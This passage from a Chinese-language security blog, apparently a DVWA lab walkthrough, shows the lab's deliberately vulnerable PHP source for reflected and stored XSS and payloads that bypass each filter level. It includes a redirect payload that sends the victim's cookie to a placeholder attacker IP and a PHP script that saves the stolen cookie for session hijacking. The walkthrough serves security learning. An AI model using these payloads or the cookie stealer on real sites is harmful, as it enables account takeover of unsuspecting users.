class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High Reflected XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium Reflected XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low Reflected XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="low-11"><a class="markdownIt-Anchor" href="#low-11">#</a> Low</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt; </span><br><span class="line">alert() confirm()prompt()</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184310810.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210428184310810"></p><h3 id="medium-11"><a class="markdownIt-Anchor" href="#medium-11">#</a> Medium</h3><ul><li>嵌套过滤、大小写转换</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;</span><br><span class="line">&lt;ScrIpT&gt;</span><br></pre></td></tr></table></figure><ul><li>url 编码</li><li>通过诱导受害人点击页面隐藏提交 name 值，访问攻击网站的 php 脚本获取用户 cookie，从而劫持会话。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;DOCUMENT.location=&quot;http://攻击IP/cookie.php&quot;&lt;/script&gt;</span><br><span class="line">需要进行url编码</span><br><span class="line">%3Cscript%3EDOCUMENT.location%3D%22http%3A%2F%2FIP%2Fcookie.php%22%3C%2Fscript%3E </span><br></pre></td></tr></table></figure><ul><li>将保存的 cookie 用于登录被攻击账户</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="high-11"><a class="markdownIt-Anchor" href="#high-11">#</a> High</h3><ul><li>script 被过滤</li><li>使用其他标签</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184344293.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210428184344293"></p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184415013.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210428184415013"></p><h2 id="stored-cross-site-scripting-xss"><a class="markdownIt-Anchor" href="#stored-cross-site-scripting-xss">#</a> Stored Cross Site Scripting (XSS)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Stored XSS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible Stored XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High Stored XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium Stored XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low Stored XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="low-12"><a class="markdownIt-Anchor" href="#low-12">#</a> Low</h3><ul><li>与反射形类似</li></ul><h3 id="medium-12"><a class="markdownIt-Anchor" href="#medium-12">#</a> Medium</h3><ul><li>与反射形类似</li></ul><h3 id="high-12"><a class="markdownIt-Anchor" href="#high-12">#</a> High</h3><ul><li>与反射形类似</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
